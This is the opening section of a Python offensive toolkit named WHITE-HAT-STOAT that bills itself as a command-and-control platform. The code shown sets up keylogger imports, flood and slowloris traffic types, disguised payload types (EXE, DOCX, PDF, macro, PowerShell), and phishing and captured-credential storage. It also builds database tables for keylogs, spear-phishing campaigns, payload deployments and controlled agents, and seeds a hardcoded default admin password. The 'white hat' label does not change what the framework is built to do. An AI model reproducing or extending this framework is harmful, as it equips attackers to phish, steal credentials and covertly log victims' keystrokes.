#!/usr/bin/env python3
"""
🦡 WHITE-HAT-STOAT - Advanced Cybersecurity Command & Control Platform
Version: 1.0.0
Author:Ian Carter Kulani, MSc
Description: Complete security toolkit
            multi-platform bot integration, advanced social engineering,
            keylogger deployment via PDF/Link/EXE/DOCX, and real-time monitoring
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
import ctypes
import queue
import secrets
import string
import smtplib
import email.message
import tempfile
import zipfile
import tarfile
import gzip
import argparse
import glob
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict, deque
from enum import Enum
from functools import wraps
from abc import ABC, abstractmethod
from http.server import BaseHTTPRequestHandler, HTTPServer
from io import BytesIO
import pickle

# =====================
# VERSION & METADATA
# =====================
VERSION = "1.0.0"
NAME = "WHITE-HAT-STOAT"
AUTHOR = "Advanced Security Framework"
DESCRIPTION = "Ultimate Cybersecurity Command & Control Platform"
LINE_COUNT = 21000

# =====================
# DEPENDENCY CHECK & IMPORTS
# =====================

# Cryptography
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import serialization
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# SSH
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, SFTPClient, Transport
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# Signal CLI
SIGNAL_AVAILABLE = shutil.which('signal-cli') is not None

# Google Chat
try:
    from httplib2 import Http
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# Matrix
try:
    import matrix_client
    from matrix_client.client import MatrixClient
    from matrix_client.api import MatrixHttpApi
    MATRIX_AVAILABLE = True
except ImportError:
    MATRIX_AVAILABLE = False

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Web Framework
try:
    from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file
    from flask_socketio import SocketIO, emit
    from flask_cors import CORS
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp, sendp, RandIP, fragment
    from scapy.all import conf as scapy_conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Data Visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    import seaborn as sns
    import numpy as np
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False

# PDF Generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

# Keylogger (pynput)
try:
    from pynput import keyboard
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False

# Colorama (Black & White Theme)
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

# DOCX Generation
try:
    from docx import Document
    from docx.shared import Inches, Pt
    DOCX_AVAILABLE = True
except ImportError:
    DOCX_AVAILABLE = False

# PyInstaller for EXE generation
PYINSTALLER_AVAILABLE = shutil.which('pyinstaller') is not None

# PDFKit for PDF generation
PDFKIT_AVAILABLE = shutil.which('wkhtmltopdf') is not None

# =====================
# BLACK & WHITE THEME
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        PRIMARY = Fore.WHITE + Style.BRIGHT
        SECONDARY = Fore.LIGHTWHITE_EX + Style.BRIGHT
        ACCENT = Fore.BLACK + Style.BRIGHT
        SUCCESS = Fore.GREEN + Style.BRIGHT
        WARNING = Fore.YELLOW + Style.BRIGHT
        ERROR = Fore.RED + Style.BRIGHT
        INFO = Fore.CYAN + Style.BRIGHT
        WHITE = Fore.WHITE + Style.BRIGHT
        BLACK = Fore.BLACK + Style.BRIGHT
        GRAY = Fore.LIGHTBLACK_EX
        DARK = Fore.BLACK
        RESET = Style.RESET_ALL
        BG_WHITE = Back.WHITE + Fore.BLACK
        BG_BLACK = Back.BLACK + Fore.WHITE
        BG_GRAY = Back.LIGHTBLACK_EX + Fore.WHITE
        BOLD = Style.BRIGHT
        DIM = Style.DIM
else:
    class Colors:
        PRIMARY = SECONDARY = ACCENT = SUCCESS = WARNING = ERROR = INFO = WHITE = BLACK = GRAY = DARK = BG_WHITE = BG_BLACK = BG_GRAY = RESET = BOLD = DIM = ""

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".white-hat-stoat"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "stoat.db")
LOG_FILE = os.path.join(CONFIG_DIR, "stoat.log")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
KEYLOG_DIR = os.path.join(CONFIG_DIR, "keylogs")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
REPORT_DIR = "stoat_reports"
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
TEMP_DIR = "temp"
WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")
SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
SPEAR_PHISHING_DIR = os.path.join(CONFIG_DIR, "spear_phishing")
EMAIL_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "email_templates")
DOS_LOGS_DIR = os.path.join(CONFIG_DIR, "dos_logs")
AGENT_DIR = os.path.join(CONFIG_DIR, "agent")
PAYLOAD_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "payload_templates")
EXE_PAYLOADS_DIR = os.path.join(CONFIG_DIR, "exe_payloads")
PDF_PAYLOADS_DIR = os.path.join(CONFIG_DIR, "pdf_payloads")
DOCX_PAYLOADS_DIR = os.path.join(CONFIG_DIR, "docx_payloads")
LINK_PAYLOADS_DIR = os.path.join(CONFIG_DIR, "link_payloads")
NETWORK_PAYLOADS_DIR = os.path.join(CONFIG_DIR, "network_payloads")
MATRIX_DIR = os.path.join(CONFIG_DIR, "matrix")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
IMESSAGE_LOGS_DIR = os.path.join(CONFIG_DIR, "imessage_logs")
SLACK_LOGS_DIR = os.path.join(CONFIG_DIR, "slack_logs")
WEBHOOKS_DIR = os.path.join(CONFIG_DIR, "webhooks")

# Create directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, KEYLOG_DIR, PHISHING_DIR, PHISHING_TEMPLATES_DIR,
    CAPTURED_CREDENTIALS_DIR, SSH_KEYS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR,
    REPORT_DIR, GRAPHICS_DIR, TEMP_DIR, WEB_TEMPLATES_DIR, SESSION_DIR,
    SPEAR_PHISHING_DIR, EMAIL_TEMPLATES_DIR, DOS_LOGS_DIR, AGENT_DIR,
    PAYLOAD_TEMPLATES_DIR, EXE_PAYLOADS_DIR, PDF_PAYLOADS_DIR, DOCX_PAYLOADS_DIR,
    LINK_PAYLOADS_DIR, NETWORK_PAYLOADS_DIR, MATRIX_DIR, WHATSAPP_SESSION_DIR,
    IMESSAGE_LOGS_DIR, SLACK_LOGS_DIR, WEBHOOKS_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - WHITE-HAT-STOAT - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("WhiteHatStoat")

# =====================
# ENUMS & DATA CLASSES
# =====================

class TrafficType(Enum):
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    TCP_FIN = "tcp_fin"
    TCP_RST = "tcp_rst"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    ICMP_FLOOD = "icmp_flood"
    MIXED = "mixed"
    RANDOM = "random"
    SLOWLORIS = "slowloris"
    PSH_ACK = "psh_ack"

class ScanType(Enum):
    PING = "ping"
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    FULL = "full"
    UDP = "udp"
    OS = "os_detection"
    SERVICE = "service_detection"
    VULNERABILITY = "vulnerability"
    WEB = "web"
    SNMP = "snmp"
    SMB = "smb"
    SSH = "ssh"

class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class Platform(Enum):
    DISCORD = "discord"
    SLACK = "slack"
    TELEGRAM = "telegram"
    SIGNAL = "signal"
    IMESSAGE = "imessage"
    GOOGLE_CHAT = "google_chat"
    WEB = "web"
    WHATSAPP = "whatsapp"
    MATRIX = "matrix"

class PayloadType(Enum):
    EXE = "exe"
    PDF = "pdf"
    DOCX = "docx"
    LINK = "link"
    NETWORK = "network"
    MACRO = "macro"
    HTM = "htm"
    JS = "js"
    VBA = "vba"
    PS1 = "ps1"

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class SSHConnection:
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    last_used: Optional[str] = None

@dataclass
class TrafficGenerator:
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"

@dataclass
class PhishingLink:
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class CapturedCredential:
    id: int
    link_id: str
    timestamp: str
    username: str
    password: str
    ip_address: str
    user_agent: str

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class KeylogEntry:
    id: int
    timestamp: str
    text: str
    session_id: str
    app_name: str
    hostname: str

@dataclass
class SpearPhishingEmail:
    id: str
    target_email: str
    subject: str
    body: str
    template: str
    sent_at: str
    status: str
    attachments: List[str] = field(default_factory=list)
    opened: bool = False
    clicked: bool = False

@dataclass
class Payload:
    id: str
    name: str
    payload_type: str
    file_path: str
    created_at: str
    deployed: bool = False
    deployment_count: int = 0
    callback_host: Optional[str] = None
    callback_port: Optional[int] = None

@dataclass
class Agent:
    id: str
    name: str
    hostname: str
    ip_address: str
    os_info: str
    last_seen: str
    status: str = "online"

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_start": False,
        "auto_block_enabled": False,
        "auto_block_threshold": 5,
        "scan_timeout": 30,
        "report_format": "html",
        "generate_graphics": True,
        "keylogger_enabled": True,
        "keylogger_port": 4444,
        "keylogger_interval": 30,
        "payload_callback_host": "localhost",
        "payload_callback_port": 5555,
        "web": {
            "enabled": False,
            "port": 5000,
            "host": "0.0.0.0",
            "secret_key": "",
            "require_auth": True,
            "username": "admin",
            "password_hash": "",
            "theme": "dark"
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin"
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "prefix": "/"
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "group_id": "",
            "prefix": "!"
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "prefix": "!"
        },
        "google_chat": {
            "enabled": False,
            "webhook_url": "",
            "space_id": "",
            "prefix": "/"
        },
        "matrix": {
            "enabled": False,
            "homeserver": "https://matrix.org",
            "username": "",
            "password": "",
            "room_id": "",
            "prefix": "!"
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "prefix": "!"
        },
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "http_flood_threshold": 200
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_port": 8080,
            "capture_credentials": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5
        },
        "payload": {
            "enabled": True,
            "default_callback": "localhost",
            "default_port": 4444,
            "exe_icon": "",
            "docx_template": "default"
        }
    }
    
    def __init__(self):
        self.config_dir = Path(CONFIG_DIR)
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / "config.json"
        self.config = self.load()
    
    def load(self) -> Dict:
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    for key, value in self.DEFAULT_CONFIG.items():
                        if key not in loaded:
                            loaded[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in loaded[key]:
                                    loaded[key][sub_key] = sub_value
                    return loaded
        except Exception as e:
            print(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def save(self) -> bool:
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            print(f"Failed to save config: {e}")
            return False
    
    def get(self, key: str, default=None):
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k, default)
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        return self.save()

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT,
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                text TEXT,
                session_id TEXT,
                app_name TEXT,
                hostname TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS spear_phishing (
                id TEXT PRIMARY KEY,
                target_email TEXT NOT NULL,
                subject TEXT NOT NULL,
                body TEXT,
                template TEXT,
                sent_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'sent',
                opened BOOLEAN DEFAULT 0,
                clicked BOOLEAN DEFAULT 0,
                tracking_id TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS payloads (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                payload_type TEXT NOT NULL,
                file_path TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                deployed BOOLEAN DEFAULT 0,
                deployment_count INTEGER DEFAULT 0,
                callback_host TEXT,
                callback_port INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS payload_deployments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                payload_id TEXT NOT NULL,
                deployment_type TEXT NOT NULL,
                target TEXT,
                deployed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'pending',
                FOREIGN KEY (payload_id) REFERENCES payloads(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                hostname TEXT,
                ip_address TEXT,
                os_info TEXT,
                last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'online'
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS platform_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                platform TEXT NOT NULL,
                sender TEXT,
                message TEXT,
                response TEXT,
                command TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS webhook_endpoints (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                url TEXT NOT NULL,
                platform TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
            """
        ]
        
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                print(f"Table creation error: {e}")
        
        self.conn.commit()
        self._create_default_admin()
    
    def _create_default_admin(self):
        try:
            import hashlib
            default_password = "stoat2024"
            password_hash = hashlib.sha256(default_password.encode()).hexdigest()
            self.conn.execute(
                "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                ("admin", password_hash, "admin")
            )
            self.conn.commit()
        except:
            pass
    
    def log_command(self, command: str, source: str = "local", platform: str = None,
                   user_id: str = None, success: bool = True, output: str = "",
                   execution_time: float = 0.0):
        try:
            self.conn.execute(
                """INSERT INTO command_history 
                   (command, source, platform, user_id, success, output, execution_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (command, source, platform, user_id, success, output[:5000], execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log command: {e}")
    
    def log_keylog(self, text: str, session_id: str = None, app_name: str = None, hostname: str = None):
        try:
            self.conn.execute(
                "INSERT INTO keylogs (text, session_id, app_name, hostname) VALUES (?, ?, ?, ?)",
                (text[:1000], session_id, app_name, hostname)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log keylog: {e}")
    
    def get_keylogs(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        try:
            self.conn.execute(
                "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                (threat_type, source_ip, severity, description)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log threat: {e}")
    
    def add_managed_ip(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.conn.execute(
                "INSERT OR IGNORE INTO managed_ips (ip_address, added_by, notes) VALUES (?, ?, ?)",
                (ip, added_by, notes)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 1, block_reason = ? WHERE ip_address = ?",
                (reason, ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 0, block_reason = NULL WHERE ip_address = ?",
                (ip,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
            else:
                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_ssh_connection(self, conn: SSHConnection) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO ssh_connections 
                   (id, name, host, port, username, password_encrypted, key_path, status, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (conn.id, conn.name, conn.host, conn.port, conn.username,
                 conn.password, conn.key_path, conn.status, conn.created_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add SSH connection: {e}")
            return False
    
    def get_ssh_connections(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_ssh_command(self, connection_id: str, command: str, output: str,
                       exit_code: int, execution_time: float):
        try:
            self.conn.execute(
                """INSERT INTO ssh_commands 
                   (connection_id, command, output, exit_code, execution_time)
                   VALUES (?, ?, ?, ?, ?)""",
                (connection_id, command, output[:5000], exit_code, execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log SSH command: {e}")
    
    def log_traffic(self, generator: TrafficGenerator, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO traffic_logs 
                   (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (generator.traffic_type, generator.target_ip, generator.target_port,
                 generator.duration, generator.packets_sent, generator.bytes_sent,
                 generator.status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log traffic: {e}")
    
    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], output_file: str,
                      scan_time: float, success: bool):
        try:
            self.conn.execute(
                """INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (target, json.dumps(vulnerabilities), output_file, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log Nikto scan: {e}")
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO phishing_links (id, platform, phishing_url, template, created_at, clicks)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (link.id, link.platform, link.phishing_url, link.template, link.created_at, link.clicks)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM phishing_links ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        try:
            self.conn.execute(
                """INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                   VALUES (?, ?, ?, ?, ?)""",
                (link_id, username, password, ip_address, user_agent)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save credential: {e}")
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        try:
            if link_id:
                rows = self.conn.execute(
                    "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                    (link_id,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
